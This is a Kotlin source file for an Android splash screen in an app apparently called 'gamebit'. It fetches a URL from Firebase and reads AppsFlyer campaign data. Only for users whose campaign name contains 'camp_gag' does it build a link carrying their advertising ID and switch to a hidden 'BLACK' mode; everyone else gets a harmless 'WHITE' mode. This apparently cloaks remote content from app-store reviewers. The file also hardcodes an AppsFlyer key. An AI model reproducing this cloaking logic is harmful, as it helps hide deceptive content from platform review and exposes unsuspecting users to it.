package com.dat.android.gamebit.presentation

import android.app.Application
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.MutableLiveData
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.dat.android.gamebit.App
import com.dat.android.gamebit.utils.Analytics
import com.dat.android.gamebit.utils.PreferenceProvider
import com.dat.android.gamebit.utils.URLMaker
import com.dat.android.gamebit.utils.fb.DBCallbacks
import com.dat.android.gamebit.utils.fb.DBWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import java.lang.Error

class SplashVM(application: Application) : AndroidViewModel(application) {
    private val CAMPAIGN_TAG = "campaign"
    val FB_PATH = "id"
    private val KEY_WORD = "camp_gag"
    private val ADVERT_ID = "advertising_id"

    private var status: MutableLiveData<Int>? = null

    private var isStartedOpen = false
    private var isStartedAps = false


    private var domain = ""
    private var naming = ""
    private var gadid = ""




    private var appContext: App
        get() = getApplication<App>()
        set(value) {}

    fun getStatusLD(): MutableLiveData<Int> {
        if (status == null) {
            status = MutableLiveData()
            startVerification()
            startAps()
        }
        return status!!
    }

    private fun startVerification() {
        if (PreferenceProvider.getUrl() == PreferenceProvider.EMPTY_URL) {
            DBWorker.requestPercent(FB_PATH, object : DBCallbacks {

                override fun onSuccess(url: String) {
                    Analytics.getDomain()
                    Analytics.setUserDomain(url)
                    domain = url
                    goNext()
                }

                override fun onError() {
                    status!!.postValue(WHITE)
                }
            })
        } else {
            status!!.value = BLACK
        }
    }

    private fun goNext() {
        if (domain != "" && naming != "" && gadid != "") {
            if (!isStartedOpen) {
                isStartedOpen = true
                if (naming.contains(KEY_WORD)) {
                    Analytics.setUserNaming(naming)
                    var afid = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)
                    var url = URLMaker.createLink(naming, domain, gadid, afid)
                    Analytics.setUserUrl(url)
                    PreferenceProvider.saveUrl(url)
                    this.status!!.postValue(BLACK)
                } else {
                    status!!.postValue(WHITE)
                }
            }
        }
    }

    private fun startAps() {
        if (!isStartedAps) {
            isStartedAps = true
            val conversionDataListener = object : AppsFlyerConversionListener {
                override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
                    data?.let { cvData ->
                        cvData.map {
                            //Log.e("LOL", "conversion_attribute:  ${it.key} = ${it.value}")
                        }

                        naming = (data!![CAMPAIGN_TAG] ?: "empty") as String
                        gadid = (data!![ADVERT_ID] ?: "empty") as String
                        goNext()

                    }
                }

                override fun onConversionDataFail(error: String?) {
                    //Log.e("LOL", "onConversionDataFail")
                    //FirebaseAnalytics.getInstance(context).logEvent("onConversionDataFail", null)
                    status!!.postValue(WHITE)
                }

                override fun onAppOpenAttribution(data: MutableMap<String, String>?) {
                    //Log.e("LOL", "onAppOpenAttribution")
                }

                override fun onAttributionFailure(error: String?) {
                    //Log.e("LOL", "onAttributionFailure")
                    status!!.postValue(WHITE)
                }
            }

            AppsFlyerLib
                .getInstance()
                .init("fTHMhfusDFFptFAiXDJ2fU", conversionDataListener, appContext)
            AppsFlyerLib.getInstance().start(appContext)
        }
    }

    companion object {
        const val WHITE = 0
        const val BLACK = 1
    }
}